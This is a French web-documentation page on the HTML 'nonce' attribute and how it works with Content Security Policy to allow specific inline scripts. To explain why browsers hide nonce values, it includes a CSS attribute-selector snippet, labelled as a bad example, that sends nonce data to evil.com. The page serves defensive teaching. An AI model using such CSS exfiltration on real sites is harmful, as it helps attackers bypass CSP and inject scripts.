---
title: "Attribut HTML universel : `nonce`"
short-title: nonce
slug: Web/HTML/Reference/Global_attributes/nonce
l10n:
  sourceCommit: 9c70c6ff09189cad43d40e241fbd2fe67349c3c2
---

[L'attribut universel](/fr/docs/Web/HTML/Reference/Global_attributes) **`nonce`** est un attribut de contenu qui définit un {{Glossary("Nonce", "nonce")}} cryptographique («&nbsp;nombre utilisé une fois&nbsp;») pouvant être utilisé par une [règle de sécurité du contenu (CSP)](/fr/docs/Web/HTTP/Guides/CSP) afin de déterminer si la récupération d'un élément sera autorisée ou non.

## Description

L'attribut `nonce` est utile pour autoriser des éléments spécifiques, tels qu'un script embarqué particulier ou des éléments de style.
Il peut vous aider à éviter d'utiliser la directive [CSP](/fr/docs/Web/HTTP/Guides/CSP) `unsafe-inline`, qui autoriserait _tous_ les scripts ou styles embarqués.

> [!NOTE]
> N'utilisez `nonce` que dans les cas où il n'est pas possible de faire autrement que d'utiliser un script ou un style embarqué non sécurisé. Si vous n'avez pas besoin de `nonce`, ne l'utilisez pas. Si votre script est statique, vous pouvez également utiliser une empreinte CSP à la place.
> (Voir les notes d'utilisation sur [script embarqué non sécurisé](/fr/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src#scripts_embarqués_non_fiables).)
> Essayez toujours de tirer pleinement parti des protections [CSP](/fr/docs/Web/HTTP/Guides/CSP) et d'éviter les nombres uniques ou les scripts embarqués non sécurisés autant que possible.

### Utiliser `nonce` pour autoriser un élément \<script>

Il y a plusieurs étapes à suivre pour autoriser un script embarqué à l'aide du mécanisme de nombre unique&nbsp;:

#### Générer une valeur

Depuis votre serveur web, générez une chaîne encodée en base64 d'au moins 128 bits de données à partir d'un générateur de nombres aléatoires cryptographiquement sécurisé. Les nonces doivent être générés différemment à chaque chargement de la page (nonce une seule fois&nbsp;!). Par exemple, en nodejs&nbsp;:

```js
import crypto from "node:crypto";

crypto.randomBytes(16).toString("base64");
// '8IBTHwOdqNKAWeKl7plt8g=='
```

#### Autoriser le script embarqué

Le nonce généré côté serveur peut ensuite être utilisé sur le script embarqué qu'on souhaite autoriser&nbsp;:

```html
<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
  // …
</script>
```

#### Envoyer le `nonce` avec un en-tête CSP

Enfin, il faut envoyer la valeur du nonce dans un en-tête [`Content-Security-Policy`](/fr/docs/Web/HTTP/Reference/Headers/Content-Security-Policy) en préfixant la chaîne de caractères avec `nonce-`&nbsp;:

```http
Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
```

### Masquage et accès au nonce

Pour des raisons de sécurité, le contenu de l'attribut `nonce` est masqué (c'est une chaîne vide qui sera retourné).

```js example-bad
script.getAttribute("nonce"); // retourne la chaîne vide
```

La propriété [`nonce`](/fr/docs/Web/API/HTMLElement/nonce) est la seule façon d'accéder aux nonces&nbsp;:

```js example-good
script.nonce; // retourne la valeur du nonce
```

Un tel masquage empêche des acteurs malveillants d'exfiltrer les données du nonce grâce à des mécanismes qui permettent d'accéder aux attributs comme&nbsp;:

```css example-bad
script[nonce~="peuimporte"] {
  background: url("https://evil.com/nonce?peuimporte");
}
```

## Spécifications

{{Specifications}}

## Compatibilité des navigateurs

{{Compat}}

## Voir aussi

- La propriété API {{DOMxRef("HTMLElement.nonce")}}
- [Politique de sécurité du contenu](/fr/docs/Web/HTTP/Guides/CSP)
- La directive CSP [`script-src`](/fr/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src)
